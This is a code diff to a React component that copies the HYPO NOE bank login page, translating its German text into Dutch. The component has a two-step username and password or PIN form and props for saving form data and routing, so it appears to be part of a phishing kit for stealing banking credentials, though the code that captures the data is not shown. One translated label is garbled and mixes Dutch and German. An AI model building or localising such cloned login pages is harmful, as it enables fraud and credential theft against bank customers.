@@ -88,11 +88,11 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
 
             {/* Info Text */}
             <p className="text-[#333] text-[13px] leading-relaxed mb-4">
-              Beim Login wird eine sichere Verbindung aufgebaut. Bitte halten Sie Ihre Anmeldedaten geheim und achten Sie darauf, dass Sie Ihre Anmeldedaten auf keiner Ihnen unbekannten Seite eingeben. Unsere Mitarbeiter werden Sie niemals nach Ihren Anmeldedaten befragen.
+              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Houd uw inloggegevens geheim en voer deze nergens anders in. Onze medewerkers zullen u nooit om uw inloggegevens vragen.
             </p>
 
             <p className="text-[#333] text-[13px] mb-6">
-              Bitte beachten Sie unsere <a href="#" className="text-[#0066cc] hover:underline">Sicherheitsempfehlungen</a>.
+              Bekijk onze <a href="#" className="text-[#0066cc] hover:underline">veiligheidsaanbevelingen</a>.
             </p>
 
             {/* Form Area */}
@@ -100,7 +100,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
               
               <div className="flex justify-between items-end mb-1">
                 <label className="text-[#666] text-[12px]">
-                  {step === 1 ? "Benutzername" : "Passwort / PIN"}
+                  {step === 1 ? "Gebruikersnaam" : "Wachtwoord / PIN"}
                 </label>
                 <a href="#" className="text-[#0066cc] text-[12px] hover:underline">
                   Barrierefrei
@@ -165,7 +165,7 @@ export function HypoNoe({ formData, onChange, handleRouteAction, saving }: Props
             {/* Footer Links inside card */}
             <div className="flex flex-col items-center gap-3 mt-8">
               <a href="#" className="text-[#0066cc] text-[13px] hover:underline">
-                Benutzernamen vergessen?
+                Gebruikersnaamn vergessen?
               </a>
               <div className="flex items-center gap-1.5 cursor-pointer group">
                 <div className="w-[18px] h-[18px] rounded-full border border-[#0066cc] text-[#0066cc] flex items-center justify-center font-serif text-[11px] group-hover:bg-[#0066cc] group-hover:text-white transition-colors">
